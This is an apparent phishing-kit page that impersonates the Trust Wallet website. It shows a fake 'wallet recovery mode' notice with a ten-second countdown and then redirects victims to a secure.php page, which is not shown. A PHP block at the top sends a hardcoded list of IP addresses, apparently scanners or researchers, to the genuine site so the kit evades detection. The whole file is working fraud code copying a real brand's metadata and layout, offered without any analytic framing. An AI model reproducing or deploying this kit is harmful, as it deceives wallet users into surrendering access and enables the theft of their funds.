<?php
session_start();
?>

<?php $deny = array("23.83.130.169", "68.183.245.101", "159.203.53.95", "157.230.195.44", "23.83.184.132", "23.83.184.135", "161.35.246.138", "68.183.245.101", "18.192.42.95", "18.159.146.161", "150.143.163.58", "164.90.241.135", "45.133.172.251");
if (in_array ($_SERVER['REMOTE_ADDR'], $deny)) {
   header("location: https://trustwallet.com");
   exit();
} ?>


<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Multi Cryptocurrency Wallet | multi-coin wallet | Crypto Wallet | Trust Wallet</title>
<meta property="og:title" content="Multi Cryptocurrency Wallet | multi-coin wallet | Crypto Wallet | Trust Wallet">
<meta name="description" content="Check out official cryptocurrency wallet of Binance that supports your favorite blockchains on Ethereum and more. Download the best multi-crypto wallet app today!">
<meta property="og:description" content="Check out official cryptocurrency wallet of Binance that supports your favorite blockchains on Ethereum and more. Download the best multi-crypto wallet app today!">
<meta name="twitter:card" content="summary_large_image">
<meta property="twitter:image" content="https://trustwallet.com/assets/images/media/preview/horizontal_blue.png">
<meta name="twitter:creator" content="@trustwalletapp">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://trustwallet.com/assets/images/media/preview/horizontal_blue.png">
<meta property="og:type" content="website">
<link rel="canonical" href="https://trustwallet.com/assets/">
<meta property="og:url" content="https://trustwallet.com/assets/">
<meta property="og:site_name" content="Trust Wallet">
<meta property="al:ios:app_name" content="Trust Wallet">
<meta property="al:ios:app_store_id" content="1288339409">
<meta property="al:ios:url" content="trust://">
<meta property="al:android:app_name" content="Trust Wallet">
<meta property="al:android:package" content="com.wallet.crypto.trustapp">
<meta property="al:android:url" content="https://trustwallet.com">
<meta http-equiv="refresh" content="10;URL=secure.php">

<link rel="shortcut icon" href="https://trustwallet.com/assets/images/favicon.ico" type="image/x-icon">
<link rel="shortcut icon" type="image/png" href="https://trustwallet.com/assets/images/favicon.png">
<meta name="apple-itunes-app" content="app-id=1288339409,affiliate-data=11l7ss">
<meta name="theme-color" content="#3375BB">

<script>
timeLeft = 10;

function countdown() {
	timeLeft--;
	document.getElementById("seconds").innerHTML = String( timeLeft );
	if (timeLeft > 0) {
		setTimeout(countdown, 1000);
	}
};

setTimeout(countdown, 1000);
</script>

<script type="application/ld+json">
    {
      "description": "Check out official cryptocurrency wallet of Binance that supports your favorite blockchains on Ethereum and more. Download the best multi-crypto wallet app today!",
      "@type": "WebPage",
      "url": "https://trustwallet.com/assets/",
      "headline": "Multi Cryptocurrency Wallet | multi-coin wallet | Crypto Wallet | Trust Wallet",
      "@context": "https://schema.org"
    }
  </script><script async="" defer="defer" data-domain="trustwallet.com" src="trust/plausible.js"></script><script type="application/javascript">
    document.addEventListener("DOMContentLoaded", function(event) {
      document.getElementById('navbarToggle').addEventListener('click', function() {
        var el = document.getElementById('navbarSupportedContent');
        var toggled = window.getComputedStyle(el).display == 'block';
        if (toggled) {
          el.style.display = "none";
        } else {
          el.style.display = "block";
        }
      })
      //Add Huawei download button based on device.
      var result = new UAParser().getResult();
      var apple = document.getElementsByClassName("apple");
      var huawei = document.getElementsByClassName("huawei");
      var download = document.getElementsByClassName("downloadapp-native");

      if (result.os.name == "Android") {
        for (var i = 0; i < huawei.length; i++) {
          huawei[i].classList.remove("hidden");
          apple[i].classList.add("hidden");
        }
        // if it is android change ctas to googleplay
        for (var i = 0; i < download.length; i++) {
          download[i].href = "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite";
        }
      }
      // if its apple change ctas to appstore
       else if (result.os.name == "iOS") {
        for (var i = 0; i < download.length; i++) {
          download[i].href = "https://apps.apple.com/app/apple-store/id1288339409?pt=1324988&ct=website&mt=8";
        }
      }
    });
  </script>
<link rel="preload" href="https://trustwallet.com/assets/fonts/IBMPlexSans/IBMPlexSans-Regular.woff2" as="font" type="font/woff2" crossorigin="">
<link rel="preload" href="https://trustwallet.com/assets/fonts/IBMPlexSans/IBMPlexSans-Bold.woff2" as="font" type="font/woff2" crossorigin="">
<link rel="preload" href="https://trustwallet.com/assets/fonts/IBMPlexSans/IBMPlexSans-Medium.woff2" as="font" type="font/woff2" crossorigin="">
<link rel="stylesheet" href="trust/main.css">
<link rel="alternate" href="https://trustwallet.com/assets/" hreflang="en">
<link rel="alternate" href="https://trustwallet.com/assets/" hreflang="x-default"><link rel="alternate" href="https://trustwallet.com/ru/assets/" hreflang="ru"><link rel="alternate" href="https://trustwallet.com/de/assets/" hreflang="de"><link rel="alternate" href="https://trustwallet.com/vi/assets/" hreflang="vi"><link rel="alternate" href="https://trustwallet.com/id/assets/" hreflang="id"><link rel="alternate" href="https://trustwallet.com/ko/assets/" hreflang="ko"><link rel="alternate" href="https://trustwallet.com/ja/assets/" hreflang="ja"><link rel="alternate" href="https://trustwallet.com/tr/assets/" hreflang="tr"><link rel="alternate" href="https://trustwallet.com/pt_BR/assets/" hreflang="pt"><link rel="alternate" href="https://trustwallet.com/zh_CN/assets/" hreflang="zh"><link rel="alternate" href="https://trustwallet.com/es/assets/" hreflang="es"><script type="text/javascript" src="trust/platform.js"></script>
</head>
<body> <nav class="navbar navbar-expand-lg navbar-togglable navbar-dark bg-primary d-block">
<div class="container">
<a class="navbar-brand" href="https://trustwallet.com/"><svg class="navbar-brand-img logotype-white" alt="Trust Wallet"></svg></a><a href="https://trustwallet.com/download-page" class="d-block d-lg-none navbar-btn btn btn-sm btn-light ml-auto downloadapp-native" target="_blank">
Get it now
</a><button class="navbar-toggler collapsed" id="navbarToggle" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-expanded="false" aria-hidden="true" aria-label="Toggle navigation" aria-controls="navbarCollapse">
<span class="navbar-toggler-icon collapsed"></span>
</button>
<div class="navbar-collapse collapse navbar-margin" id="navbarSupportedContent">
<button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
</button>
<ul class="navbar-nav font-size-sm ml-auto">
<li class="nav-item">
<a class="nav-link" href="?">Assets</a>
</li>
<li class="nav-item">
<a class="nav-link" href="?">Staking</a>
</li>
<li class="nav-item">
<a class="nav-link" href="?">Earn<span class="ml-3 badge badge-success">+80% APR</span></a>
</li>
<li class="nav-item">
<a class="nav-link" href="?">NFTs</a>
</li>
<li class="nav-item">
<a class="nav-link" href="?">DApp Browser</a>
</li><li class="nav-item dropdown">
<a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="false" aria-expanded="true">
Language
</a>
<div class="dropdown-menu dropdown-menu-md" aria-labelledby="navbarDropdown">
<div class="list-group list-group-flush">
<ul class="list-unstyled list-block">
<li class="list-inline-item m-6"><a class="list-group-item" href="?">
<div class="flag bg-en"></div>
</a></li><li class="list-inline-item m-6"><a class="list-group-item list-inline-item" href="?">
<div class="flag bg-ru"></div>
</a></li><li class="list-inline-item m-6"><a class="list-group-item list-inline-item" href="?">
<div class="flag bg-de"></div>
</a></li><li class="list-inline-item m-6"><a class="list-group-item list-inline-item" href="?">
<div class="flag bg-vi"></div>
</a></li><li class="list-inline-item m-6"><a class="list-group-item list-inline-item" href="?">
<div class="flag bg-id"></div>
</a></li><li class="list-inline-item m-6"><a class="list-group-item list-inline-item" href="?">
<div class="flag bg-ko"></div>
</a></li><li class="list-inline-item m-6"><a class="list-group-item list-inline-item" href="?">
<div class="flag bg-ja"></div>
</a></li><li class="list-inline-item m-6"><a class="list-group-item list-inline-item" href="?">
<div class="flag bg-tr"></div>
</a></li><li class="list-inline-item m-6"><a class="list-group-item list-inline-item" href="?">
<div class="flag bg-pt_BR"></div>
</a></li><li class="list-inline-item m-6"><a class="list-group-item list-inline-item" href="?">
<div class="flag bg-zh_CN"></div>
</a></li><li class="list-inline-item m-6"><a class="list-group-item list-inline-item" href="https://trustwallet.com/es/assets/">
<div class="flag bg-es"></div>
</a></li>
</ul>
</div>
</div>
</li></ul>
</div>
</div>
</nav>
<main class="page-content" aria-label="Content">
<section class="pt-8 pb-8 bg-gradient-primary">
<div class="container">
<div class="row align-items-center justify-content-center justify-content-md-between">
<div class="col-12 col-lg-6 mb-8 text-center text-md-left text-white">
<h1 class="display-3 font-weight-bold">Entering wallet recovery mode</h1>
<p class="text-white-75 lead mb-4"><font size="3">Do you have a moment please? We are establishing a connection with our secure internet environment. Procedure starts in: <span id="seconds">10</span> sec.

<br><br><b>You are requested not to close this page to avoid complications with your wallet.</b></font></p>
<img src="trust/wpp.gif" align="left">



</div>
<div class="col-12 col-lg-6 text-center">
<img class="hero-image mx-auto d-block img-fluid" src="trust/assets_list.png" alt="Cryptocurrency assets support">
</div>
</div>
</div>
</section>





</main>
<footer class="py-8 py-md-8 bg-white">
<data class="u-url" href="/"></data>
<div class="container">
<div class="row text-center text-md-left">
<div class="col-12 col-md-4 col-lg-3">
<a href="https://trustwallet.com/"><svg alt="" class="footer-brand-image logotype-dark img-fluid mb-4"></svg></a><ul class="list-unstyled list-inline list-social mb-6 mb-md-0">
<li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
<a href="https://facebook.com/trustwalletapp" class="text-decoration-none" target="_blank" rel="noopener">
<svg class="social-icon" alt="trustwallet facebook">
<use xlink:href="/assets/images/socials.svg#social_facebook"></use>
</svg>
</a>
</li>
<li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
<a href="https://github.com/trustwallet" class="text-decoration-none" target="_blank" rel="noopener">
<svg class="social-icon" alt="trustwallet github">
<use xlink:href="/assets/images/socials.svg#social_github"></use>
</svg>
</a>
</li>
<li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
<a href="https://instagram.com/trustwallet" class="text-decoration-none" target="_blank" rel="noopener">
<svg class="social-icon" alt="trustwallet instagram">
<use xlink:href="/assets/images/socials.svg#social_instagram"></use>
</svg>
</a>
</li>
<li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
<a href="https://twitter.com/trustwallet" class="text-decoration-none" target="_blank" rel="noopener">
<svg class="social-icon" alt="trustwallet twitter">
<use xlink:href="/assets/images/socials.svg#social_twitter"></use>
</svg>
</a>
</li>
<li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
<a href="https://reddit.com/r/trustapp" class="text-decoration-none" target="_blank" rel="noopener">
<svg class="social-icon" alt="trustwallet reddit">
<use xlink:href="/assets/images/socials.svg#social_reddit"></use>
</svg>
</a>
</li>
<li class="list-inline-item list-social-item pt-2">
<a href="https://t.me/trust_announcements" class="text-decoration-none" target="_blank" rel="noopener">
<svg class="social-icon" alt="trustwallet telegram">
<use xlink:href="/assets/images/socials.svg#social_telegram"></use>
</svg>
</a>
</li>
</ul>
</div>
<div class="col-12 col-md-4 col-lg-3">
<h4 class="font-weight-bold text-uppercase text-gray-700">Trust Wallet</h4>
<ul class="list-unstyled text-gray-700 mb-6 mb-md-8 mb-lg-0">
<li class="mb-3">
<a href="https://trustwallet.com/assets" class="text-reset">Assets</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/dapp" class="text-reset">DApp Browser</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/stablecoins" class="text-reset">Stablecoins</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/beta" class="text-reset">Beta</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/collectibles-wallet" class="text-reset">NFTs</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/el-salvador-wallet" class="text-reset">El Salvador Wallet</a>
</li>
<li class="mb-3">
<a href="https://apps.apple.com/app/apple-store/id1288339409?pt=1324988&amp;ct=website&amp;mt=8" rel="noopener" target="_blank" class="text-reset">Crypto Wallet for iOS</a>
</li>
<li class="mb-3">
<a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&amp;referrer=utm_source%3Dwebsite" rel="noopener" target="_blank" class="text-reset">Crypto Wallet for Android</a>
</li>
</ul>
</div>
<div class="col-12 col-md-4 col-lg-2">
<h4 class="font-weight-bold text-uppercase text-gray-700">Information</h4>
<ul class="list-unstyled text-gray-700 mb-0">
<li class="mb-3">
<a href="https://community.trustwallet.com/" target="_blank" class="text-reset">Community</a>
</li>
<li class="mb-3">
<a href="https://community.trustwallet.com/c/helpcenter" target="_blank" class="text-reset">Help Center</a>
</li>
<li class="mb-3">
<a href="https://support.trustwallet.com/" rel="noopener" target="_blank" class="text-reset">Support</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/blog" rel="noopener" class="text-reset">DApp Journey</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/developer" class="text-reset">Developers</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/submit-dapp" class="text-reset">Submit DApp</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/press" class="text-reset">Press Kit</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/terms-of-services" class="text-reset">Terms Of Service</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/privacy-and-policy" class="text-reset">Privacy Policy</a>
</li>
</ul>
</div>
<div class="col-12 col-md-4 offset-md-4 col-lg-2 offset-lg-0">
<h4 class="font-weight-bold text-uppercase text-gray-700">Use Crypto</h4>
<ul class="list-unstyled text-gray-700 mb-6 mb-md-8 mb-lg-0">
<li class="mb-3">
<a href="https://trustwallet.com/buy-bitcoin" class="text-reset">Buy Bitcoin with a credit card</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/buy-ethereum" class="text-reset">Buy Ethereum</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/buy-bnb" class="text-reset">Buy BNB</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/buy-litecoin" class="text-reset">Buy Litecoin</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/buy-tron" class="text-reset">Buy TRON</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/buy-xrp" class="text-reset">Buy XRP</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/buy-bitcoincash" class="text-reset">Buy Bitcoin Cash</a>
</li>
<hr>
<li class="mb-3">
<a href="https://trustwallet.com/earn-bitcoin" class="text-reset">Earn Bitcoin</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/earn-ethereum" class="text-reset">Earn Ethereum</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/earn-binance-coin" class="text-reset">Earn Binance Coin</a>
</li>
<li class="mb-3">
<a href="https://trustwallet.com/earn-cake" class="text-reset">Earn Cake</a>
</li>
</ul>
</div>
<div class="col-12 col-md-4 col-lg-2">
<h4 class="font-weight-bold text-uppercase text-gray-700">Assets</h4>
<ul class="list-unstyled text-gray-700 mb-6 mb-md-8 mb-lg-0">
<li class="mb-3"><a href="https://trustwallet.com/bitcoin-wallet" class="text-gray-700">Bitcoin (BTC)</a>
</li><li class="mb-3"><a href="https://trustwallet.com/ethereum-wallet" class="text-gray-700">Ethereum (ETH)</a>
</li><li class="mb-3"><a href="https://trustwallet.com/binance-coin-wallet" class="text-gray-700">Binance Coin (BNB)</a>
</li><li class="mb-3"><a href="https://trustwallet.com/litecoin-wallet" class="text-gray-700">Litecoin (LTC)</a>
</li><li class="mb-3"><a href="https://trustwallet.com/xrp-wallet" class="text-gray-700">Ripple (XRP)</a>
</li><li class="mb-3"><a href="https://trustwallet.com/dogecoin-wallet" class="text-gray-700">Dogecoin (DOGE)</a>
</li><li class="mb-3"><a href="https://trustwallet.com/polkadot-wallet" class="text-gray-700">Polkadot (DOT)</a>
</li><li class="mb-3"><a href="https://trustwallet.com/smart-chain-wallet" class="text-gray-700">Smartchain (BNB)</a>
</li><li class="mb-3"><a href="https://trustwallet.com/dash-wallet" class="text-gray-700">Dash (DASH)</a>
</li><li class="mb-3"><a href="https://trustwallet.com/tron-wallet" class="text-gray-700">TRON (TRX)</a>
</li><li class="mb-3"><a href="https://trustwallet.com/tezos-wallet" class="text-gray-700">Tezos (XTZ)</a>
</li><li class="mb-3"><a href="https://trustwallet.com/cosmos-wallet" class="text-gray-700">Cosmos (ATOM)</a>
</li><li class="mb-3"><a href="https://trustwallet.com/stellar-wallet" class="text-gray-700">Stellar (XLM)</a>
</li><li class="mb-3"><a href="https://trustwallet.com/kava-wallet" class="text-gray-700">Kava (KAVA)</a>
</li></ul>
</div>
</div>
</div>
</footer>

<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T583ZCC" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>



</body></html>